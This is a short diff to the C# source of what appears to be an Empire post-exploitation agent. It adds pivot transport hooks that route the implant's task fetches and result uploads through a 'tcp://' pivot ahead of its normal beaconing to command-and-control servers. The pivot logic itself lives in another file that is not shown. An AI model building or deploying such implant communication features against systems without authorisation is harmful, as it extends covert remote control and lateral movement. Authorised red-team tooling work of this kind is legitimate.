@@ -279,6 +279,11 @@ AESc = AES encrypted using the client's session key
                 return malleableResult;
             }
 
+            byte[] pivotResult = null;
+            bool pivotUsed = false;
+            TryPivotGet(ref pivotResult, ref pivotUsed);
+            if (pivotUsed) return pivotResult;
+
             byte[] results = new byte[0];
             try
             {
@@ -323,6 +328,10 @@ AESc = AES encrypted using the client's session key
             TryMalleableSend(routingPacket, ref malleableUsed);
             if (malleableUsed) return;
 
+            bool pivotSendUsed = false;
+            TryPivotSend(routingPacket, ref pivotSendUsed);
+            if (pivotSendUsed) return;
+
             Random random = new Random();
             string controlServer = sessionInfo.GetControlServers()[random.Next(sessionInfo.GetControlServers().Length)];
 
@@ -355,6 +364,10 @@ AESc = AES encrypted using the client's session key
         // Counterpart for POST task-result uploads. Same no-op-when-absent
         // semantics as TryMalleableGet.
         partial void TryMalleableSend(byte[] routingPacket, ref bool handled);
+
+        // tcp:// pivot transport hooks, implemented in Empire.Agent.Pivot.Child.cs.
+        partial void TryPivotGet(ref byte[] result, ref bool handled);
+        partial void TryPivotSend(byte[] routingPacket, ref bool handled);
 
         private void ProcessTaskingPackets(byte[] encryptedTask)
         {
